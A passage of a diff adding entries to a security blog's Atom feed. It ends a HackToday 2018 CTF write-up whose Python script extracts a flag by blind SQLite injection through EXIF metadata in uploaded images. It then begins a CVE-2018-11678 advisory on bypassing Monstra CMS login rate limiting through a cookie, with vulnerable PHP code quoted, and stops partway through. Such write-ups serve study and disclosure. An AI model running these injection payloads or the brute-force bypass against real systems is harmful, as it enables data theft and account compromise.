+    &lt;span class=&quot;n&quot;&gt;token&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;re&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;r&quot;type=\&quot;hidden\&quot; value=\&quot;(.*)\&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;greptoken&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;group&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;upload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Curl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;StringIO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;h&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;StringIO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;URL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HTTPPOST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'legpic'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FORM_FILE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'1leg.jpg'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)),&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'submit'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Deteksi'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'token'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))])&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;COOKIEFILE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'cookie.txt'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;COOKIEJAR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'cookie.txt'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FOLLOWLOCATION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;WRITEFUNCTION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setopt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HEADERFUNCTION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;perform&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getvalue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;blind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kolom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;table&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;passwd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;lo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;hi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;255&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;mid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;
+            &lt;span class=&quot;c&quot;&gt;# command = &quot;exiftool -ImageDescription=\&quot;leg=(SELECT CASE when hex(substr({},{},1)) &amp;lt;= hex(char({})) THEN 1 ELSE 2 END FROM {})\&quot; 1leg.jpg&quot;.format(str(kolom),str(idx),str(mid),str(table))&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;command&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;exiftool -ImageDescription=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;leg=(SELECT CASE when hex(substr({},{},1)) &amp;lt;= hex(char({})) THEN 1 ELSE 2 END FROM {}))--+-&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; 1leg.jpg&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kolom&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;table&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;upload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getToken&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
+
+            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+               &lt;span class=&quot;n&quot;&gt;hi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+               &lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mid&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+               &lt;span class=&quot;n&quot;&gt;lo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+               
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hi&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;passwd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;temp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Result [{}]: {}&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;table&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;passwd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;idx&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;passwd&lt;/span&gt;
+   
+
+
+
+&lt;span class=&quot;c&quot;&gt;# blind(&quot;sql&quot;,&quot;sqlite_master&quot;)&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# CREATE TABLE Legs (Id INTEGER PRIMARY KEY, Session TEXT UNIQUE, Leg INTEGER)&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# blind(&quot;name&quot;,&quot;sqlite_master where name!=char(76,101,103,115) and sql like(char(37,102,108,97,103,37))&quot;)&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# mysecretflaag&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# blind(&quot;sql&quot;,&quot;sqlite_master where name=char(109,121,115,101,99,114,101,116,102,108,97,97,103)&quot;)&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# CREATE TABLE mysecretflaag (Id INTEGER PRIMARY KEY, thi&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;blind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;this_is_real_flag&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;mysecretflaag&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#HackToday{blind_sqlite3_injection_via_exif_&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;../images/legcounter.PNG&quot; alt=&quot;Error&quot; /&gt;&lt;/p&gt;
+
+  
+  &lt;p&gt;&lt;a href=&quot;http://localhost:4000/ctf/writeup-legcount-hacktoday-Copy&quot;&gt;Hacktoday Quals 2018 - Legcounter&lt;/a&gt; was originally published by Abdillah Muhamad at &lt;a href=&quot;http://localhost:4000&quot;&gt;@abdilahrf&lt;/a&gt; on August 05, 2018.&lt;/p&gt;</content>
+</entry>
+
+
+
+<entry>
+  <title type="html"><![CDATA[Monstra CMS - 3.0.4 Login Rate Limiting Bypass]]></title>
+  <link rel="alternate" type="text/html" href="http://localhost:4000/login-rate-limiting-bypass"/>
+  <id>http://localhost:4000/login-rate-limiting-bypass</id>
+  <published>2018-04-01T00:00:00+07:00</published>
+  <updated>2018-04-01T00:00:00-00:00</updated>
+  
+  <author>
+    <name>Abdillah Muhamad</name>
+    <uri>http://localhost:4000</uri>
+    <email>hasny1337@gmail.com</email>
+  </author>
+  
+  
+  <category scheme="http://localhost:4000/tags/#exploit" term="exploit" />
+  
+  
+  <content type="html">
+  
+    &lt;h2 id=&quot;cve-2018-11678&quot;&gt;CVE-2018-11678&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Exploit Title:&lt;/strong&gt; Monstra CMS &amp;lt;= 3.0.4 Login Rate Limiting Bypass&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;CVE:&lt;/strong&gt;  CVE-2018-11678&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Vendor Homepage:&lt;/strong&gt; http://monstra.org/&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Software Link:&lt;/strong&gt; https://bitbucket.org/Awilum/monstra/downloads/monstra-3.0.4.zip&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Discovered by:&lt;/strong&gt; Abdillah Muhamad&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Contact:&lt;/strong&gt; abdilah.pb@gmail.com&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Website:&lt;/strong&gt; https://abdilahrf.github.io&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Category:&lt;/strong&gt; webapps&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Platform:&lt;/strong&gt; PHP&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;MonstraCMS 3.0.4 Implementing bruteforce protection in login form but we manage to bypass because we can control the cookie value.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Vulnerable Code:&lt;/strong&gt; https://github.com/monstra-cms/monstra/blob/dev/plugins/box/users/users.plugin.php&lt;/p&gt;
+
+&lt;p&gt;line 396-400:&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Cookie&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'login_attempts'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Cookie&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'login_attempts'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            
+            &lt;span class=&quot;nx&quot;&gt;Notification&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setNow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'error'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'You are banned for 10 minutes. Try again later'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'users'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;line 422-427:&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Cookie&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'login_attempts'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;nv&quot;&gt;$attempts&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Cookie&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'login_attempts'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+            &lt;span class=&quot;nx&quot;&gt;Cookie&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'login_attempts'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$attempts&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;600&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;nx&quot;&gt;Notification&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;setNow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'error'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'You are banned for 10 minutes. Try again later'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'users'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;line 437-442:&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Cookie&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'login_attempts'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
